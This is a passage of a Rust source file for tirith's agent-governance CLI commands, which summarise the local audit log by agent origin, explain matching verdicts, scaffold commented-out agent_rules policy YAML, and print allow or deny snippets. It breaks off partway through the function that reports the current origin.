//! `tirith agent sessions / explain / policy init / allow / block / current` —
//! agent-governance observability surface.
//!
//! [`AgentOrigin`] records *who* invoked tirith through every verdict/audit
//! entry; this module makes that signal inspectable and surfaces the
//! `agent_rules` policy schema the engine enforces in `escalation.rs`. Every
//! command here is a local file operation (no network, off the detection hot
//! path); runtime enforcement lives in `escalation.rs`, not here.
//!
//! `tirith agent allow` only validates a matcher and prints a YAML snippet — it
//! does NOT mutate `.tirith/policy.yaml`; the operator integrates it themselves
//! so an honest review precedes any widening of trust.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use tirith_core::agent_origin::AgentOrigin;
use tirith_core::audit_aggregator;
// `FilesystemWriteScope` / `NetworkPredicate` / `SecretsAccessPredicate` are
// intentionally NOT imported: `agent block` no longer mints them (R12-2:
// matching is kind+name only, so emitting them is a footgun). The struct still
// carries the fields and `Policy::load` still parses them for forward-compat.
use tirith_core::policy::{self, AgentMatcher, AgentOriginKind};

/// Resolve the audit log path. Mirrors the private `audit::default_log_path` so
/// tests can drive the CLI against a temp file without exporting that helper.
fn resolve_log_path(override_path: Option<&str>) -> Option<PathBuf> {
    if let Some(p) = override_path {
        if p.trim().is_empty() {
            return None;
        }
        return Some(PathBuf::from(p));
    }
    policy::data_dir().map(|d| d.join("log.jsonl"))
}

/// Best-effort one-line label for an [`AgentOrigin`]. Every caller-claimed
/// string is `{:?}`-escaped so a hostile name cannot inject control sequences
/// into the operator's terminal (same convention as `mcp.rs::escape_name`).
fn label_origin(origin: &AgentOrigin) -> String {
    match origin {
        AgentOrigin::Human { interactive } => {
            if *interactive {
                "human (interactive)".to_string()
            } else {
                "human (non-interactive)".to_string()
            }
        }
        AgentOrigin::Agent { tool, version } => match version {
            Some(v) => format!("agent ({:?} {:?})", tool, v),
            None => format!("agent ({:?})", tool),
        },
        AgentOrigin::Mcp {
            client_name,
            client_version,
        } => match client_version {
            Some(v) => format!("mcp ({:?} {:?})", client_name, v),
            None => format!("mcp ({:?})", client_name),
        },
        AgentOrigin::Gateway => "gateway".to_string(),
        AgentOrigin::Ci { provider } => match provider {
            Some(p) => format!("ci ({:?})", p),
            None => "ci (generic)".to_string(),
        },
        AgentOrigin::Ide { name } => format!("ide ({:?})", name),
    }
}

/// Stable `BTreeMap` group key (`kind` + optional caller payload) for
/// deterministic ordering. Same kind+payload but different versions group
/// together — version is observability detail, not identity.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
struct OriginGroupKey {
    kind: String,
    payload: Option<String>,
    // Split interactive-vs-not for `human`.
    interactive_flag: Option<bool>,
}

impl OriginGroupKey {
    fn from_origin(origin: Option<&AgentOrigin>) -> Self {
        match origin {
            None => Self {
                kind: "unknown".to_string(),
                payload: None,
                interactive_flag: None,
            },
            Some(AgentOrigin::Human { interactive }) => Self {
                kind: "human".to_string(),
                payload: None,
                interactive_flag: Some(*interactive),
            },
            Some(AgentOrigin::Agent { tool, .. }) => Self {
                kind: "agent".to_string(),
                payload: Some(tool.clone()),
                interactive_flag: None,
            },
            Some(AgentOrigin::Mcp { client_name, .. }) => Self {
                kind: "mcp".to_string(),
                payload: Some(client_name.clone()),
                interactive_flag: None,
            },
            Some(AgentOrigin::Gateway) => Self {
                kind: "gateway".to_string(),
                payload: None,
                interactive_flag: None,
            },
            Some(AgentOrigin::Ci { provider }) => Self {
                kind: "ci".to_string(),
                payload: provider.clone(),
                interactive_flag: None,
            },
            Some(AgentOrigin::Ide { name }) => Self {
                kind: "ide".to_string(),
                payload: Some(name.clone()),
                interactive_flag: None,
            },
        }
    }

    /// Human label for the group — same convention as [`label_origin`].
    fn label(&self) -> String {
        match (
            self.kind.as_str(),
            self.payload.as_deref(),
            self.interactive_flag,
        ) {
            ("unknown", _, _) => "unknown".to_string(),
            ("human", _, Some(true)) => "human (interactive)".to_string(),
            ("human", _, Some(false)) => "human (non-interactive)".to_string(),
            ("human", _, None) => "human".to_string(),
            ("gateway", _, _) => "gateway".to_string(),
            ("ci", None, _) => "ci (generic)".to_string(),
            ("ci", Some(p), _) => format!("ci ({:?})", p),
            (kind, Some(p), _) => format!("{kind} ({:?})", p),
            (kind, None, _) => kind.to_string(),
        }
    }
}

// `tirith agent sessions`

#[derive(Debug, Clone, serde::Serialize)]
struct SessionGroup {
    /// Kind tag (`"human"`/`"agent"`/`"mcp"`/`"gateway"`/`"ci"`/`"ide"`/`"unknown"`).
    kind: String,
    /// Caller-claimed payload (tool / client_name / provider / ide name);
    /// `None` for human/gateway/unknown/generic-CI.
    #[serde(skip_serializing_if = "Option::is_none")]
    payload: Option<String>,
    /// Interactivity flag for `human`; `None` otherwise.
    #[serde(skip_serializing_if = "Option::is_none")]
    interactive: Option<bool>,
    count: usize,
    /// Last-seen ISO 8601 timestamp.
    last_seen: String,
    /// Per-action histogram; `Allow`/`Warn`/`Block` guaranteed, others (e.g.
    /// `WarnAck`) flow through under their own key.
    actions: BTreeMap<String, usize>,
}

pub fn sessions(log_override: Option<&str>, json: bool) -> i32 {
    let Some(log_path) = resolve_log_path(log_override) else {
        report_error(
            json,
            "tirith agent sessions",
            "no audit log path could be resolved",
        );
        return 1;
    };

    // A missing audit log is not an error — report it plainly with zero groups.
    if !log_path.exists() {
        if json {
            if !write_sessions_json(&log_path, &[]) {
                return 1;
            }
        } else {
            eprintln!(
                "tirith agent sessions: no audit log at {} (zero sessions).",
                log_path.display()
            );
        }
        return 0;
    }

    let read = match audit_aggregator::read_log(&log_path) {
        Ok(r) => r,
        Err(e) => {
            report_error(
                json,
                "tirith agent sessions",
                &format!("could not read {}: {e}", log_path.display()),
            );
            return 1;
        }
    };

    // Group only `verdict` entries — hook_telemetry / trust_change carry
    // `agent_origin = None` and would conflate categories.
    let mut groups: BTreeMap<OriginGroupKey, SessionGroup> = BTreeMap::new();
    for record in read
        .records
        .iter()
        .filter(|r| r.entry_type.is_empty() || r.entry_type == "verdict")
    {
        let key = OriginGroupKey::from_origin(record.agent_origin.as_ref());
        let entry = groups.entry(key.clone()).or_insert_with(|| SessionGroup {
            kind: key.kind.clone(),
            payload: key.payload.clone(),
            interactive: key.interactive_flag,
            count: 0,
            last_seen: String::new(),
            actions: BTreeMap::new(),
        });
        entry.count += 1;
        *entry.actions.entry(record.action.clone()).or_insert(0) += 1;
        // Max by lexicographic compare — UTC RFC 3339 sorts correctly.
        if record.timestamp > entry.last_seen {
            entry.last_seen.clone_from(&record.timestamp);
        }
    }

    let groups_sorted: Vec<SessionGroup> = groups.into_values().collect();

    if json {
        if !write_sessions_json(&log_path, &groups_sorted) {
            return 1;
        }
    } else {
        print_sessions_human(&log_path, &groups_sorted, read.skipped_lines);
    }
    0
}

fn write_sessions_json(log_path: &Path, groups: &[SessionGroup]) -> bool {
    #[derive(serde::Serialize)]
    struct Out<'a> {
        schema_version: u32,
        log_path: String,
        group_count: usize,
        total_entries: usize,
        groups: &'a [SessionGroup],
    }
    let total: usize = groups.iter().map(|g| g.count).sum();
    let out = Out {
        schema_version: 1,
        log_path: log_path.display().to_string(),
        group_count: groups.len(),
        total_entries: total,
        groups,
    };
    super::write_json_stdout(&out, "tirith agent sessions: failed to write JSON output")
}

fn print_sessions_human(log_path: &Path, groups: &[SessionGroup], skipped: usize) {
    if groups.is_empty() {
        eprintln!(
            "tirith agent sessions: no verdict entries in {} yet.",
            log_path.display()
        );
        if skipped > 0 {
            eprintln!("  ({skipped} malformed audit line(s) were skipped during read.)");
        }
        return;
    }

    let total: usize = groups.iter().map(|g| g.count).sum();
    eprintln!(
        "tirith agent sessions: {} verdict(s) across {} origin group(s) in {}.",
        total,
        groups.len(),
        log_path.display(),
    );
    eprintln!();
    for g in groups {
        eprint!("{}", format_session_group(g));
    }
    if skipped > 0 {
        eprintln!();
        eprintln!("  ({skipped} malformed audit line(s) were skipped during read.)");
    }
}

/// Render a `SessionGroup` row. Split out so it's unit-testable without
/// redirecting stderr. `last_seen` (operator-trust input from the JSONL log) is
/// `{:?}`-escaped here so a stray control byte renders as `\u{...}` rather than
/// reaching the terminal raw (Finding G defense-in-depth); `key.label()`
/// already escapes its payload.
fn format_session_group(g: &SessionGroup) -> String {
    let key = OriginGroupKey {
        kind: g.kind.clone(),
        payload: g.payload.clone(),
        interactive_flag: g.interactive,
    };
    let allow = g.actions.get("Allow").copied().unwrap_or(0);
    let warn = g.actions.get("Warn").copied().unwrap_or(0)
        + g.actions.get("WarnAck").copied().unwrap_or(0);
    let block = g.actions.get("Block").copied().unwrap_or(0);
    format!(
        "  {label:<40}  count={count}  allow={allow}  warn={warn}  block={block}  last={last:?}\n",
        label = key.label(),
        count = g.count,
        last = g.last_seen,
    )
}

// `tirith agent explain`

#[derive(Debug, Clone, serde::Serialize)]
struct ExplainMatch {
    timestamp: String,
    session_id: String,
    action: String,
    rule_ids: Vec<String>,
    command_redacted: String,
    bypass_requested: bool,
    bypass_honored: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    agent_origin: Option<AgentOrigin>,
    #[serde(skip_serializing_if = "Option::is_none")]
    policy_path: Option<String>,
}

/// Cap on matching entries surfaced, to keep output terminal-readable.
const EXPLAIN_MAX_MATCHES: usize = 20;

pub fn explain(query: &str, log_override: Option<&str>, json: bool) -> i32 {
    let query = query.trim();
    if query.is_empty() {
        report_error(
            json,
            "tirith agent explain",
            "session id or command query is empty",
        );
        return 1;
    }

    let Some(log_path) = resolve_log_path(log_override) else {
        report_error(
            json,
            "tirith agent explain",
            "no audit log path could be resolved",
        );
        return 1;
    };

    if !log_path.exists() {
        report_error(
            json,
            "tirith agent explain",
            &format!(
                "no audit log at {} (no entries to explain)",
                log_path.display()
            ),
        );
        return 1;
    }

    let read = match audit_aggregator::read_log(&log_path) {
        Ok(r) => r,
        Err(e) => {
            report_error(
                json,
                "tirith agent explain",
                &format!("could not read {}: {e}", log_path.display()),
            );
            return 1;
        }
    };

    let query_lower = query.to_ascii_lowercase();
    let mut matches: Vec<ExplainMatch> = read
        .records
        .into_iter()
        .filter(|r| r.entry_type.is_empty() || r.entry_type == "verdict")
        .filter(|r| {
            // Exact session-id, then command substring, then origin-label
            // substring (so an operator can search "claude-code" etc.).
            if r.session_id == query {
                return true;
            }
            if r.command_redacted
                .to_ascii_lowercase()
                .contains(&query_lower)
            {
                return true;
            }
            if let Some(origin) = r.agent_origin.as_ref() {
                if label_origin(origin)
                    .to_ascii_lowercase()
                    .contains(&query_lower)
                {
                    return true;
                }
            }
            false
        })
        .map(|r| ExplainMatch {
            timestamp: r.timestamp,
            session_id: r.session_id,
            action: r.action,
            rule_ids: r.rule_ids,
            command_redacted: r.command_redacted,
            bypass_requested: r.bypass_requested,
            bypass_honored: r.bypass_honored,
            agent_origin: r.agent_origin,
            policy_path: r.policy_path,
        })
        .collect();

    // Newest-first ordering keeps the most actionable entries on top.
    matches.sort_by(|a, b| b.timestamp.cmp(&a.timestamp));
    let truncated = matches.len() > EXPLAIN_MAX_MATCHES;
    if truncated {
        matches.truncate(EXPLAIN_MAX_MATCHES);
    }

    if matches.is_empty() {
        report_error(
            json,
            "tirith agent explain",
            &format!("no matching audit entries for {:?}", query),
        );
        return 1;
    }

    if json {
        if !write_explain_json(&log_path, query, &matches, truncated) {
            return 1;
        }
    } else {
        print_explain_human(&log_path, query, &matches, truncated);
    }
    0
}

fn write_explain_json(
    log_path: &Path,
    query: &str,
    matches: &[ExplainMatch],
    truncated: bool,
) -> bool {
    #[derive(serde::Serialize)]
    struct Out<'a> {
        schema_version: u32,
        log_path: String,
        query: &'a str,
        match_count: usize,
        truncated: bool,
        matches: &'a [ExplainMatch],
    }
    let out = Out {
        schema_version: 1,
        log_path: log_path.display().to_string(),
        query,
        match_count: matches.len(),
        truncated,
        matches,
    };
    super::write_json_stdout(&out, "tirith agent explain: failed to write JSON output")
}

fn print_explain_human(log_path: &Path, query: &str, matches: &[ExplainMatch], truncated: bool) {
    eprintln!(
        "tirith agent explain: {} match(es) for {:?} in {}.",
        matches.len(),
        query,
        log_path.display(),
    );
    if truncated {
        eprintln!("  (output truncated to the most recent {EXPLAIN_MAX_MATCHES} entries.)");
    }
    eprintln!();
    for m in matches {
        eprint!("{}", format_explain_match(m));
    }
}

/// Render an `ExplainMatch` block. Split out so it's unit-testable without
/// redirecting stderr. Every caller-controlled string (timestamp, session_id,
/// action, rule_ids, command_redacted, policy_path — all operator-trust input
/// from the JSONL log) is `{:?}`-escaped here so a control byte a previous
/// sanitizer let through renders as `\u{...}` not raw (Finding G H1);
/// `label_origin` applies the same to the payload.
fn format_explain_match(m: &ExplainMatch) -> String {
    let origin = m
        .agent_origin
        .as_ref()
        .map(label_origin)
        .unwrap_or_else(|| "unknown".to_string());
    let rules_joined = if m.rule_ids.is_empty() {
        "-".to_string()
    } else {
        m.rule_ids.join(",")
    };
    let mut s = String::new();
    s.push_str(&format!(
        "  {ts:?}  session={sid:?}  origin={origin}  action={action:?}  rules={rules:?}\n",
        ts = m.timestamp,
        sid = m.session_id,
        action = m.action,
        rules = rules_joined,
    ));
    s.push_str(&format!("      command: {:?}\n", m.command_redacted));
    if m.bypass_requested {
        s.push_str(&format!(
            "      bypass: requested={}  honored={}\n",
            m.bypass_requested, m.bypass_honored,
        ));
    }
    if let Some(p) = m.policy_path.as_deref() {
        s.push_str(&format!("      policy: {p:?}\n"));
    }
    s.push('\n');
    s
}

// `tirith agent policy init`

#[derive(Debug, Clone, serde::Serialize)]
struct AgentPolicyScaffold {
    /// `true` when the log was readable (a missing log yields a header-only scaffold).
    audit_present: bool,
    /// The path the log was loaded from.
    log_path: String,
    /// Observed origin groups, sorted (kind, payload).
    origins: Vec<ObservedOrigin>,
}

#[derive(Debug, Clone, serde::Serialize)]
struct ObservedOrigin {
    kind: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    payload: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    interactive: Option<bool>,
    count: usize,
}

pub fn policy_init(log_override: Option<&str>, force: bool, json: bool) -> i32 {
    let repo_root = match find_repo_root_or_cwd() {
        Ok(r) => r,
        Err(e) => {
            report_error(json, "tirith agent policy init", &e);
            return 1;
        }
    };
    policy_init_for_root(&repo_root, log_override, force, json)
}

/// `policy init` against an explicit repo root (so tests drive a tempdir
/// without mutating process-wide env vars).
pub(crate) fn policy_init_for_root(
    repo_root: &Path,
    log_override: Option<&str>,
    force: bool,
    json: bool,
) -> i32 {
    let tirith_dir = repo_root.join(".tirith");
    let example_path = tirith_dir.join("agent-policy.yaml.example");

    if example_path.exists() && !force {
        report_error(
            json,
            "tirith agent policy init",
            &format!(
                "{} already exists (use --force to overwrite)",
                example_path.display()
            ),
        );
        return 1;
    }

    // Build the scaffold from the audit log (when available).
    let log_path = resolve_log_path(log_override);
    let (audit_present, observed_log_path, origins) = match log_path.as_deref() {
        None => (false, "<unset>".to_string(), Vec::new()),
        Some(p) if !p.exists() => (false, p.display().to_string(), Vec::new()),
        Some(p) => match audit_aggregator::read_log(p) {
            Ok(read) => {
                let mut groups: BTreeMap<OriginGroupKey, ObservedOrigin> = BTreeMap::new();
                for record in read
                    .records
                    .iter()
                    .filter(|r| r.entry_type.is_empty() || r.entry_type == "verdict")
                    .filter(|r| r.agent_origin.is_some())
                {
                    let key = OriginGroupKey::from_origin(record.agent_origin.as_ref());
                    let entry = groups.entry(key.clone()).or_insert(ObservedOrigin {
                        kind: key.kind.clone(),
                        payload: key.payload.clone(),
                        interactive: key.interactive_flag,
                        count: 0,
                    });
                    entry.count += 1;
                }
                (
                    true,
                    p.display().to_string(),
                    groups.into_values().collect(),
                )
            }
            Err(e) => {
                report_error(
                    json,
                    "tirith agent policy init",
                    &format!("could not read {}: {e}", p.display()),
                );
                return 1;
            }
        },
    };

    let scaffold = AgentPolicyScaffold {
        audit_present,
        log_path: observed_log_path,
        origins,
    };

    if let Err(e) = std::fs::create_dir_all(&tirith_dir) {
        report_error(
            json,
            "tirith agent policy init",
            &format!("failed to create {}: {e}", tirith_dir.display()),
        );
        return 1;
    }

    let yaml_body = render_agent_policy_scaffold_yaml(&scaffold);
    if let Err(e) = std::fs::write(&example_path, &yaml_body) {
        report_error(
            json,
            "tirith agent policy init",
            &format!("failed to write {}: {e}", example_path.display()),
        );
        return 1;
    }

    if json {
        if !write_policy_init_json(repo_root, &example_path, &scaffold) {
            return 1;
        }
    } else {
        print_policy_init_human(&example_path, &scaffold);
    }
    0
}

/// Render the scaffold to YAML, every entry commented out by design (mirrors
/// `tirith mcp policy init`). Deterministic: byte-identical across runs against
/// the same log (sorted origins, fixed header, no embedded timestamps).
fn render_agent_policy_scaffold_yaml(scaffold: &AgentPolicyScaffold) -> String {
    let mut s = String::new();
    s.push_str("# Tirith agent governance policy scaffold (example)\n");
    s.push_str("# Generated by `tirith agent policy init` from the local audit log.\n");
    s.push_str("#\n");
    s.push_str("# This is an EXAMPLE — every entry below is commented out. Copy the\n");
    s.push_str("# entries you want into `.tirith/policy.yaml` (merging under any\n");
    s.push_str("# existing `agent_rules:` block) and uncomment them. Re-run\n");
    s.push_str("# `tirith agent policy init --force` to regenerate from the latest\n");
    s.push_str("# audit log.\n");
    s.push_str("#\n");
    s.push_str("# How `agent_rules` is enforced (M4 item 8): when the verdict's\n");
    s.push_str("# `agent_origin` matches a `deny` entry, the verdict is forced to\n");
    s.push_str("# Block and an `agent_denied_by_policy` finding is appended naming\n");
    s.push_str("# the matched origin and policy file. A `deny` match beats any\n");
    s.push_str("# matching `allow`. `allow` is NOT a bypass — a verdict the engine\n");
    s.push_str("# already blocked stays blocked even if the caller is on the allow\n");
    s.push_str("# list. Enforcement runs on every analysis path: `tirith check`,\n");
    s.push_str("# the gateway, `tirith paste`, `install`, `ecosystem scan`, and all\n");
    s.push_str("# MCP `tools/call_check_*` handlers (`call_check_command`,\n");
    s.push_str("# `call_check_url`, `call_check_paste`). The interactive `TIRITH=0`\n");
    s.push_str("# bypass currently skips `agent_rules` (pinned by\n");
    s.push_str("# `agent_rules_deny_skipped_under_tirith_bypass_today`); we plan\n");
    s.push_str("# to revisit this in a future release.\n");
    s.push_str("#\n");
    s.push_str("# Trust model: every signal feeding AgentOrigin is OPERATOR-TRUST,\n");
    s.push_str("# never adversary-resistant — TIRITH_INTEGRATION, MCP clientInfo,\n");
    s.push_str("# CI env vars, is_terminal() are all settable by any process running\n");
    s.push_str("# as the user. See docs/agent-governance-design.md.\n");
    s.push('\n');

    if !scaffold.audit_present {
        s.push_str("# No audit log was found at the configured path — run a few\n");
        s.push_str("# `tirith check` / `tirith paste` commands to populate it, then\n");
        s.push_str("# re-run this command. Until then, the scaffold below is the\n");
        s.push_str("# template form of an agent_rules block.\n");
        s.push('\n');
    }

    if scaffold.origins.is_empty() {
        s.push_str("# The audit log recorded no agent origins yet, so there is nothing\n");
        s.push_str("# to scaffold from. The structure is shown below as a template:\n");
        s.push_str("#\n");
        s.push_str("# agent_rules:\n");
        s.push_str("#   allow:\n");
        s.push_str("#     - kind: agent\n");
        s.push_str("#       name: claude-code\n");
        s.push_str("#     - kind: mcp\n");
        s.push_str("#       name: Cursor\n");
        s.push_str("#   deny:\n");
        s.push_str("#     - kind: agent\n");
        s.push_str("#       name: untrusted-tool\n");
        return s;
    }

    s.push_str("agent_rules:\n");
    s.push_str("  # Observed origins from the audit log are listed below as `allow`\n");
    s.push_str("  # candidates. Review each and uncomment only the ones you intend\n");
    s.push_str("  # to declare — importing a scaffold must NEVER silently widen trust.\n");
    s.push_str("  # allow:\n");
    for o in &scaffold.origins {
        match (o.kind.as_str(), o.payload.as_deref()) {
            ("human", _) => {
                // Human / gateway entries have no caller-claimed payload.
                let inter = o
                    .interactive
                    .map(|b| if b { "interactive" } else { "non-interactive" })
                    .unwrap_or("");
                s.push_str(&format!(
                    "  #   - kind: human    # {} entries; observed {inter}\n",
                    o.count,
                ));
            }
            ("gateway", _) => {
                s.push_str(&format!("  #   - kind: gateway    # {} entries\n", o.count,));
            }
            ("ci", None) => {
                s.push_str(&format!(
                    "  #   - kind: ci    # {} entries (generic CI)\n",
                    o.count,
                ));
            }
            (kind, Some(payload)) => {
                s.push_str(&format!(
                    "  #   - kind: {kind}\n  #     name: {}    # {} entries\n",
                    yaml_safe_scalar(payload),
                    o.count,
                ));
            }
            (kind, None) => {
                s.push_str(&format!("  #   - kind: {kind}    # {} entries\n", o.count,));
            }
        }
    }
    s.push('\n');
    s.push_str("  # Use `deny` for the inverse — origins you want to block. A deny\n");
    s.push_str("  # entry beats any matching allow entry (mirrors blocklist over\n");
    s.push_str("  # allowlist elsewhere in this policy). Example:\n");
    s.push_str("  # deny:\n");
    s.push_str("  #   - kind: agent\n");
    s.push_str("  #     name: untrusted-tool\n");
    s
}

fn print_policy_init_human(example_path: &Path, scaffold: &AgentPolicyScaffold) {
    if !scaffold.audit_present {
        eprintln!(
            "tirith agent policy init: no audit log found at {} — wrote a header-only scaffold.",
            scaffold.log_path
        );
        eprintln!(
            "  Run a few `tirith check` / `tirith paste` commands to populate the log, then re-run this command."
        );
    } else if scaffold.origins.is_empty() {
        eprintln!(
            "tirith agent policy init: audit log at {} recorded no agent origins — wrote a template scaffold.",
            scaffold.log_path
        );
    } else {
        eprintln!(
            "tirith agent policy init: scaffolded {} observed origin group(s) from {}.",
            scaffold.origins.len(),
            scaffold.log_path,
        );
        eprintln!("  Every entry is commented out — uncomment the ones you wish to declare.");
        eprintln!("  Enforcement is active on every analysis path: `tirith check`, the gateway, `paste`, `install`, `ecosystem scan`, and all MCP `tools/call_check_*` handlers.");
        eprintln!("  The interactive `TIRITH=0` bypass currently skips `agent_rules` (pinned by `agent_rules_deny_skipped_under_tirith_bypass_today`); we plan to revisit this in a future release.");
    }
    eprintln!("  wrote {}", example_path.display());
    println!("{}", example_path.display());
}

fn write_policy_init_json(
    repo_root: &Path,
    example_path: &Path,
    scaffold: &AgentPolicyScaffold,
) -> bool {
    #[derive(serde::Serialize)]
    struct Out<'a> {
        schema_version: u32,
        repo_root: String,
        example_path: String,
        scaffold: &'a AgentPolicyScaffold,
    }
    let out = Out {
        schema_version: 1,
        repo_root: repo_root.display().to_string(),
        example_path: example_path.display().to_string(),
        scaffold,
    };
    super::write_json_stdout(
        &out,
        "tirith agent policy init: failed to write JSON output",
    )
}

// `tirith agent allow`

pub fn allow(kind_str: &str, tool: Option<&str>, json: bool) -> i32 {
    let Some(kind) = AgentOriginKind::parse(kind_str) else {
        report_error(
            json,
            "tirith agent allow",
            &format!(
                "unknown kind {:?} (valid: human, agent, mcp, gateway, ci, ide)",
                kind_str
            ),
        );
        return 1;
    };

    // Validation: a tool filter on a payloadless kind matches nothing.
    if tool.is_some() && matches!(kind, AgentOriginKind::Human | AgentOriginKind::Gateway) {
        report_error(
            json,
            "tirith agent allow",
            &format!(
                "kind: {} carries no caller-claimed payload — a --tool filter would match nothing",
                kind.as_str()
            ),
        );
        return 1;
    }

    // PR #120 fix-6: sanitize `--tool` through the same `sanitize_caller_label`
    // pipeline stored origins use, else `--tool "  claude-code  "` never matches
    // the (whitespace-stripped) stored origin. Empty-check is AFTER sanitization
    // so `--tool "   "` falls into the empty-string rejection arm.
    let name = tool.map(tirith_core::agent_origin::sanitize_caller_label);
    if matches!(name.as_deref(), Some("")) {
        report_error(
            json,
            "tirith agent allow",
            "--tool must not be empty (an empty payload matches nothing)",
        );
        return 1;
    }

    let matcher = AgentMatcher::new(kind, name);

    let snippet = render_allow_snippet(&matcher);

    if json {
        #[derive(serde::Serialize)]
        struct Out<'a> {
            schema_version: u32,
            matcher: &'a AgentMatcher,
            snippet: &'a str,
            /// Honest reminder: this command does NOT mutate any policy file.
            applied: bool,
        }
        let out = Out {
            schema_version: 1,
            matcher: &matcher,
            snippet: &snippet,
            applied: false,
        };
        if !super::write_json_stdout(&out, "tirith agent allow: failed to write JSON output") {
            return 1;
        }
    } else {
        eprintln!("tirith agent allow: valid matcher — paste the snippet below under `agent_rules.allow:` in your policy.");
        eprintln!("  (NOTE: `allow` is not a bypass — a verdict the engine already blocked stays blocked even when the caller is on the allow list. `deny` beats `allow`.)");
        eprintln!();
        // Print snippet to stdout so it can be captured / piped into a file.
        print!("{snippet}");
    }
    0
}

/// Render the matcher as a YAML list-item for `agent_rules.allow`, two-space
/// indented to merge cleanly into a `tirith policy init` template.
fn render_allow_snippet(m: &AgentMatcher) -> String {
    let mut s = String::new();
    s.push_str(&format!("    - kind: {}\n", m.kind.as_str()));
    if let Some(t) = m.name.as_deref() {
        s.push_str(&format!("      name: {}\n", yaml_safe_scalar(t)));
    }
    s
}

// `tirith agent block` — emit a deny-list YAML snippet

/// `tirith agent block --kind <k> [--tool <t>] <pattern>`. Validates the matcher
/// like [`allow`], then prints the snippet for `agent_rules.deny:`. Deny is
/// purely structural — any deny matcher forces a `Block` (beating allow) and the
/// engine keys on `(kind, name)` ONLY.
///
/// The `command_pattern` positional is NOT folded into the matcher (no
/// per-command matching yet); it is rendered as a leading YAML comment for
/// operator documentation. The `--filesystem-write` / `--network` /
/// `--secrets-access` flags were REMOVED (M13 PR #132 round-28): since the engine
/// ignores those predicates, a snippet carrying one would LOOK conditional but
/// deny EVERY command — a silent footgun. The struct still carries the fields
/// and `Policy::load` parses them for forward-compat; only `agent block` rejects them.
pub fn block(kind_str: &str, payload: Option<&str>, command_pattern: &str, json: bool) -> i32 {
    let Some(kind) = AgentOriginKind::parse(kind_str) else {
        report_error(
            json,
            "tirith agent block",
            &format!(
                "unknown kind {:?} (valid: human, agent, mcp, gateway, ci, ide)",
                kind_str
            ),
        );
        return 1;
    };

    if payload.is_some() && matches!(kind, AgentOriginKind::Human | AgentOriginKind::Gateway) {
        report_error(
            json,
            "tirith agent block",
            &format!(
                "kind: {} carries no caller-claimed payload — a --tool filter would match nothing",
                kind.as_str()
            ),
        );
        return 1;
    }

    // Same `sanitize_caller_label` as `allow`, keeping the matcher
    // byte-comparable against stored origins.
    let name = payload.map(tirith_core::agent_origin::sanitize_caller_label);
    if matches!(name.as_deref(), Some("")) {
        report_error(
            json,
            "tirith agent block",
            "--tool must not be empty (an empty payload matches nothing)",
        );
        return 1;
    }

    if command_pattern.trim().is_empty() {
        report_error(
            json,
            "tirith agent block",
            "<pattern> must not be empty — pass `*` to mean \"all commands\"",
        );
        return 1;
    }

    let matcher = AgentMatcher::new(kind, name);
    let snippet = render_block_snippet(&matcher, command_pattern);

    if json {
        #[derive(serde::Serialize)]
        struct Out<'a> {
            schema_version: u32,
            matcher: &'a AgentMatcher,
            /// The pattern the operator typed, echoed back for correlation. Not
            /// yet honored by the engine — see `command_pattern_supported`.
            command_pattern: &'a str,
            /// Whether the engine enforces `command_pattern`. Always `false`
            /// (matching is `(kind, name)` only); captured for forward compat.
            command_pattern_supported: bool,
            snippet: &'a str,
            /// Honest reminder: this command does NOT mutate any policy file.
            applied: bool,
        }
        let out = Out {
            schema_version: 1,
            matcher: &matcher,
            command_pattern,
            command_pattern_supported: false,
            snippet: &snippet,
            applied: false,
        };
        if !super::write_json_stdout(&out, "tirith agent block: failed to write JSON output") {
            return 1;
        }
    } else {
        eprintln!("tirith agent block: valid matcher — paste the snippet below under `agent_rules.deny:` in your policy.");
        eprintln!("  (NOTE: `deny` is enforced on every analysis path — see `tirith agent allow --help` for the enforcement scope. `deny` beats `allow`.)");
        eprintln!("  (NOTE: today the engine matches on `(kind, name)` only; the <pattern> arg is rendered as a YAML comment for operator documentation. Per-command matching is a planned extension.)");
        eprintln!();
        // Print snippet to stdout so it can be captured / piped into a file.
        print!("{snippet}");
    }
    0
}

/// Render the matcher as a YAML list-item for `agent_rules.deny` (two-space
/// indented). The `pattern` is a leading `# command pattern:` comment, run
/// through `yaml_safe_scalar` so a hostile pattern with ANSI/newlines can't
/// inject into adjacent YAML lines.
fn render_block_snippet(m: &AgentMatcher, pattern: &str) -> String {
    let mut s = String::new();
    s.push_str(&format!(
        "    # command pattern: {}\n",
        yaml_safe_scalar(pattern)
    ));
    s.push_str(&format!("    - kind: {}\n", m.kind.as_str()));
    if let Some(t) = m.name.as_deref() {
        s.push_str(&format!("      name: {}\n", yaml_safe_scalar(t)));
    }
    // No semantic predicates emitted — the engine keys on `(kind, name)` only,
    // so a predicate would silently widen the deny to ALL commands (the flags
    // were removed in M13 PR #132 round-28).
    s
}

// `tirith agent current` — print the running process's claimed origin

/// Report the [`AgentOrigin`] the engine would attribute to this process now,
/// via the same `resolve_cli_origin` / interactive detection `tirith check`
/// uses. Observability, not enforcement: every signal is caller-claimed and
/// settable by any process running as the user — use it to debug agent-rules /
/// hook integration, never as authentication.
pub fn current(json: bool) -> i32 {
    // Mirror `cli::check`'s interactive detection — env override, else the
    // stderr-TTY heuristic (no flag here; this command runs no analysis).
    let interactive = if let Ok(val) = std::env::var("TIRITH_INTERACTIVE") {
        val == "1"
    } else {
        is_terminal::is_terminal(std::io::stderr())
    };

    let origin = tirith_core::agent_origin::resolve_cli_origin(interactive);

    if json {
        let signals = current_signals(interactive);
        #[derive(serde::Serialize)]
        struct Out<'a> {
            schema_version: u32,
            kind: &'a str,
            origin: &'a AgentOrigin,
            signals: &'a CurrentSignalsOwned,
        }
        let out = Out {
            schema_version: 1,
            kind: origin.kind(),
            origin: &origin,
            signals: &signals,
        };
        if !super::write_json_stdout(&out, "tirith agent current: failed to write JSON output") {
            return 1;
        }
    } else {
        print_current_human(&origin, interactive);
    }
    0
}

/// Per-signal snapshot for `current --format json`, in one helper so the
/// stringly-typed env lookups live in one place.
fn current_signals(interactive: bool) -> CurrentSignalsOwned {
    let tirith_integration = std::env::var("TIRITH_INTEGRATION").ok().and_then(|raw| {
        let s = tirith_core::agent_origin::sanitize_caller_label(&raw);
        (!s.is_empty()).then_some(s)
    });
    let tirith_integration_version =
        std::env::var("TIRITH_INTEGRATION_VERSION")
            .ok()
